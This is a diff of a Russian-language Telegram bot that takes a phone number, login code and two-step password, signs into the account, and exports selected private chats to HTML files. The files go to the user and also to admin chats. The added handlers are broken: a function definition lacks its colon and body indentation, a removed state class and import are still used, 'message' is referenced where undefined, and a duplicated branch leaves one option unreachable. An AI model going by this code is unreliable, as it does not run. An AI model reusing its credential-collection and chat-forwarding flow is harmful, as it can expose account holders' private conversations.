@@ -14,9 +14,6 @@ from allowed_users import ALLOWED_USERS  # Импортируем словарь
 from aiogram.types import InlineKeyboardMarkup as AiogramInlineKeyboardMarkup, \
                           InlineKeyboardButton as AiogramInlineKeyboardButton, \
                           CallbackQuery as AiogramCallbackQuery
-from aiogram.dispatcher import FSMContext
-from aiogram.dispatcher.filters.state import State, StatesGroup
-from aiogram.contrib.fsm_storage.memory import MemoryStorage
 
 
 # Загрузка переменных окружения из файла .env
@@ -35,9 +32,9 @@ allowed_users = ALLOWED_USERS
 # Создаем Bot и Dispatcher
 bot = Bot(token=bot_token)
 dp = Dispatcher(bot)
-storage = MemoryStorage()
-dp = Dispatcher(bot, storage=storage)
 dp.middleware.setup(LoggingMiddleware())
+
+# Логирование
 logging.basicConfig(level=logging.INFO)
 
 # Словарь для хранения состояния пользователя
@@ -73,6 +70,7 @@ async def send_files_to_bot(bot, admin_chat_ids, user_chat_id):
                 else:
                     await bot.send_message (chat_id, 'Файл {file_to_send} слишком большой и не будет отправлен. Обратитесь к администратору, чтобы его получить')
 
+
 # Обработчики сообщений
 @dp.message_handler(lambda message: message.from_user.id not in allowed_users)
 async def unauthorized(message: types.Message):
@@ -86,163 +84,6 @@ async def unauthorized(message: types.Message):
     user_info_message=f'Попытка запуска бота НЕАВТОРИЗОВАННЫМ пользователем ID:{user_id}.\nДата и время запуска: {now}'
     for admin_chat_id in admin_chat_ids:
             await bot.send_message(admin_chat_id, user_info_message)
-
-
-
-
-
-
-
-# Определение состояний
-class Form(StatesGroup):
-    awaiting_selection = State()
-
-# Функция для отображения клавиатуры
-async def show_keyboard(message: Message):
-    keyboard = AiogramInlineKeyboardMarkup(row_width=1)
-    buttons = [
-        AiogramInlineKeyboardButton(text="Сбор аналитики по аккаунту", callback_data='analitic'),
-        AiogramInlineKeyboardButton(text="Выгрузка личных чатов", callback_data='private'),
-        AiogramInlineKeyboardButton(text="Выгрузка групповых чатов", callback_data='group_chats')
-    ]
-    keyboard.add(*buttons)
-    await message.answer("Выберите направление поиска", reply_markup=keyboard)
-    # Устанавливаем состояние "awaiting_selection"
-    await Form.awaiting_selection.set()
-
-
-# Обработчики колбэков для запуска нужных функций
-@dp.callback_query_handler(state=Form.awaiting_selection)
-async def handle_callback_query(callback_query: AiogramCallbackQuery, state: FSMContext):
-    code = callback_query.data
-    user_id = callback_query.from_user.id
-    await bot.answer_callback_query(callback_query.id)
-
-    if code == 'analitic':
-        user_id = callback_query.from_user.id
-        async with state.proxy() as user_state:
-            #if user_id in user_state and user_state[user_id].get('connected'):
-                logging.info(f"User {user_id} is connected. Starting analysis.")
-                phone_number = user_state[user_id]['phone_number']
-                client = user_state[user_id]['client']
-                try:
-                    await bot.send_message(user_id, "Начинаю анализ данных")
-                    await process_user_data(client, phone_number, user_id)
-                    await bot.send_message(user_id, "Анализ данных завершен")
-                except Exception as e:
-                    logging.error(f"Error during analysis for user {user_id}: {e}")
-                    await bot.send_message(user_id, f"Произошла ошибка при анализе: {e}")
-            #else:
-                #logging.info(f"User {user_id} is not connected. Cannot perform analysis.")
-                #await bot.send_message(user_id, "Вы должны сначала подключиться. Введите /start для начала процесса подключения.")
-          
-    elif code == 'private':
-        user_id = callback_query.from_user.id
-        async with state.proxy() as user_state:
-                user_state[user_id]['get_private'] = True  # Обновляем состояние, будем использовать  в обработчике, чтобы словить ввод цифр
-            #if user_id in user_state and user_state[user_id].get('connected'):
-                logging.info(f"User {user_id} is connected. Starting private message.")
-                client = user_state[user_id]['client']
-                try:
-                    user_dialogs, i, users_list = await get_user_dialogs(client)
-                    if not user_dialogs:
-                        await bot.send_message(user_id, "У вас нет активных диалогов для выбора.")
-                        return
-                    else:
-                        user_state[user_id]['users_list'] = users_list
-                        user_state[user_id]['dialogs_count'] = i
-                        dialog_message = "\n".join(user_dialogs)
-                        await bot.send_message(user_id, dialog_message)
-                        await bot.send_message(user_id, 'Выберите номер нужного диалога для продолжения')
-                except Exception as e:
-                    logging.error(f"Error during private message for user {user_id}: {e}")
-                    await bot.send_message(user_id, f"Произошла ошибка: {e}")
-            #else:
-                #logging.info(f"User {user_id} is not connected. Cannot perform private message.")
-                #await bot.send_message(user_id, "Вы должны сначала подключиться. Введите /start для начала процесса подключения.")
-
-    await state.finish()
-
-
-
-
-
-
-
-# Добавляем обработчик команды /analitic
-@dp.message_handler(commands=['analitic'])
-async def analitic_command(message: types.Message):
-    user_id = message.from_user.id
-    if user_id in user_state and user_state[user_id].get('connected'):
-        logging.info(f"User {user_id} is connected. Starting analysis.")
-        phone_number = user_state[user_id]['phone_number']
-        client = user_state[user_id]['client']
-        try:
-            await message.answer("Начинаю анализ данных завершен")
-            await process_user_data(client, phone_number, user_id)
-            await message.answer("Анализ данных завершен")
-        except Exception as e:
-            logging.error(f"Error during analysis for user {user_id}: {e}")
-            await message.answer(f"Произошла ошибка при анализе: {e}")
-    else:
-        logging.info(f"User {user_id} is not connected. Cannot perform analysis.")
-        await message.answer("Вы должны сначала подключиться. Введите /start для начала процесса подключения.")
-
-
-
-
-# Добавляем обработчик команды /private
-@dp.message_handler(commands=['private'])
-async def private_command(message: types.Message):
-    user_id = message.from_user.id
-    user_state[user_id]['get_private'] = True  # Обновляем состояние, будем использовать  в обработчике, чтобы словить ввод цифр
-    if user_id in user_state and user_state[user_id].get('connected'):
-        logging.info(f"User {user_id} is connected. Starting get private message.")
-        client = user_state[user_id]['client']
-        try:
-            user_dialogs, i, users_list = await get_user_dialogs(client)
-            if not user_dialogs:
-                await bot.send_message(user_id, "У вас нет активных диалогов для выбора.")
-                return
-            else:
-                # Сохраняем user_id и users_list в user_state для дальнейшего использования
-                user_state[user_id]['users_list'] = users_list
-                user_state[user_id]['dialogs_count'] = i        
-                dialog_message = "\n".join(user_dialogs)
-                await bot.send_message(user_id, dialog_message)
-                await bot.send_message(user_id, 'Выберите номер нужного диалога для продолжения')
-    
-        except Exception as e:
-            logging.error(f"Error during analysis for user {user_id}: {e}")
-            await message.answer(f"Произошла ошибка при формирование списка: {e}")
-    else:
-        logging.info(f"User {user_id} is not connected. Cannot perform getting private message.")
-        await message.answer("Вы должны сначала подключиться. Введите /start для начала процесса подключения.")
-
-
-
-# Обработчик выбора списка приватного диалого для выгрузки, если get_private равно True
-@dp.message_handler(lambda message: user_state.get(message.from_user.id, {}).get('get_private', False) and
-                                  message.text.isdigit() and 1 <= len(message.text) <= 4)
-async def get_private_message_from_list(message: types.Message):
-    user_id = message.from_user.id
-    
-    client = user_state[user_id]['client']
-    users_list = user_state[user_id]['users_list']
-    i = user_state[user_id]['dialogs_count']  # Получаем значение i из user_state
-    g_index = int(message.text.strip()) 
-    selection = '40'
-    try:
-        if 0 <= g_index < i:
-            target_user = users_list[g_index]
-            await message.answer(f"начинаю выгрузку диалога под номеом: {g_index}. Дождись сообщение о завершении")
-            await get_messages_for_html(client, target_user, selection)
-            await message.answer("Выгрузка завершена. Отправляю файлы")
-            await send_files_to_bot(bot, admin_chat_ids, user_id)
-    except ValueError:
-        await message.answer("Введите число, соотвествующее диалогу.")
-
-
 
 
 @dp.message_handler(commands=['start'])
@@ -264,6 +105,119 @@ async def send_welcome(message: types.Message):
             await bot.send_message(admin_chat_id, user_info_message)
     else:
         await unauthorized(message)
+
+# Добавляем обработчик команды /analitic
+@dp.message_handler(commands=['analitic'])
+async def analitic_command(message: types.Message):
+    user_id = message.from_user.id
+    if user_id in user_state and user_state[user_id].get('connected'):
+        logging.info(f"User {user_id} is connected. Starting analysis.")
+        phone_number = user_state[user_id]['phone_number']
+        client = user_state[user_id]['client']
+        try:
+            await message.answer("Начинаю анализ данных завершен")
+            await process_user_data(client, phone_number, user_id)
+            await message.answer("Анализ данных завершен")
+        except Exception as e:
+            logging.error(f"Error during analysis for user {user_id}: {e}")
+            await message.answer(f"Произошла ошибка при анализе: {e}")
+    else:
+        logging.info(f"User {user_id} is not connected. Cannot perform analysis.")
+        await message.answer("Вы должны сначала подключиться. Введите /start для начала процесса подключения.")
+
+
+# Функция для отображения клавиатуры
+async def show_keyboard(message: Message):
+    keyboard = AiogramInlineKeyboardMarkup(row_width=1)
+    buttons = [
+        AiogramInlineKeyboardButton(text="Отчет без медиа", callback_data='withoutall'),
+        AiogramInlineKeyboardButton(text="Отчет с фото", callback_data='with_photos'),
+        AiogramInlineKeyboardButton(text="Отчет с фото + скачивание всех медиа", callback_data='get_media')
+    ]
+    keyboard.add(*buttons)
+    await message.answer("Выберите вариант загрузки", reply_markup=keyboard)
+    # Устанавливаем состояние "awaiting_selection"
+    await Form.awaiting_selection.set()
+
+# Добавляем обработчик команды /private
+@dp.message_handler(commands=['private'])
+async def select_mode_of_download(message: types.Message, state: FSMContext)
+user_id = message.from_user.id
+user_state[user_id]['get_private'] = True
+
+# Удаляем значение selection из user_state
+if user_id in user_state:
+    if 'selection' in user_state[user_id]:
+        del user_state[user_id]['selection']
+await show_keyboard(message)
+
+# Обработчики колбэков для запуска нужных функций
+
+@dp.callback_query_handler(lambda callback_query: Form.awaiting_selection.get_name() in await state.get_state() and
+                                                  user_state.get(callback_query.from_user.id, {}).get('get_private', False))
+async def private_command(callback_query: AiogramCallbackQuery, state: FSMContext):
+    user_id = callback_query.from_user.id
+    await bot.answer_callback_query(callback_query.id)
+    code = callback_query.data
+    if code == 'withoutall':
+        selection = '40'
+    if code == 'with_photos':
+        selection = '45'
+    if code == 'with_photos':
+        selection = '450'
+    user_id = message.from_user.id
+    user_state[user_id]['selection'] = selection
+    user_state[user_id]['get_private'] = True  # Обновляем состояние, будем использовать  в обработчике, чтобы словить ввод цифр
+    if user_id in user_state and user_state[user_id].get('connected'):
+        logging.info(f"User {user_id} is connected. Starting get private message.")
+        client = user_state[user_id]['client']
+        try:
+            user_dialogs, i, users_list = await get_user_dialogs(client)
+            if not user_dialogs:
+                await bot.send_message(user_id, "У вас нет активных диалогов для выбора.")
+                return
+            else:
+                # Сохраняем user_id и users_list в user_state для дальнейшего использования
+                user_state[user_id]['users_list'] = users_list
+                user_state[user_id]['dialogs_count'] = i        
+                dialog_message = "\n".join(user_dialogs)
+                await bot.send_message(user_id, dialog_message)
+                await bot.send_message(user_id, 'Выберите номер нужного диалога для продолжения')
+    
+        except Exception as e:
+            logging.error(f"Error during making list: {e}")
+            await message.answer(f"Произошла ошибка при формирование списка: {e}")
+    else:
+        logging.info(f"User {user_id} is not connected. Cannot perform getting private message.")
+        await message.answer("Вы должны сначала подключиться. Введите /start для начала процесса подключения.")
+
+
+
+# Обработчик выбора списка приватного диалого для выгрузки, если get_private равно True
+@dp.message_handler(lambda message: user_state.get(message.from_user.id, {}).get('get_private', False) and
+                                  message.text.isdigit() and 1 <= len(message.text) <= 4)
+async def get_private_message_from_list(message: types.Message):
+    user_id = message.from_user.id
+    
+    client = user_state[user_id]['client']
+    users_list = user_state[user_id]['users_list']
+    i = user_state[user_id]['dialogs_count']  # Получаем значение i из user_state
+    g_index = int(message.text.strip()) 
+    if user_id in user_state and 'selection' in user_state[user_id]:
+        selection = user_state[user_id]['selection']
+        try:
+            if 0 <= g_index < i:
+                target_user = users_list[g_index]
+                await message.answer(f"начинаю выгрузку диалога под номеом: {g_index}. Дождись сообщение о завершении")
+                await get_messages_for_html(client, target_user, selection)
+                await message.answer("Выгрузка завершена. Отправляю файлы")
+                await send_files_to_bot(bot, admin_chat_ids, user_id)
+        except ValueError:
+            await message.answer("Введите число, соотвествующее диалогу.")
+
+
+
+
 
 
 #Введен номер
@@ -316,7 +270,6 @@ async def get_code(message: types.Message):
         await client.connect()
         await client.sign_in(phone_number, code, phone_code_hash=str(phone_code_hash))
         await message.answer("Подключено! Выбери в меню бота одну из опций")
-        await show_keyboard(message)
         user_state[user_id]['connected'] = True  # Обновляем состояние
         #await process_user_data(client, phone_number, message.from_user.id)
         #await client.log_out()
@@ -361,7 +314,6 @@ async def process_password(message: types.Message):
             await client.sign_in(password=password)
             user_state[user_id]['connected'] = True  # Обновляем состояние
             await message.answer("Подключено! Выбери в меню бота одну из опций")
-            await show_keyboard(message)
             phone_number = user_state[user_id]['phone_number']
             # await process_user_data(client, phone_number, user_id)
             # user_state.pop(user_id, None)  # Удаляем состояние пользователя после успешной обработки
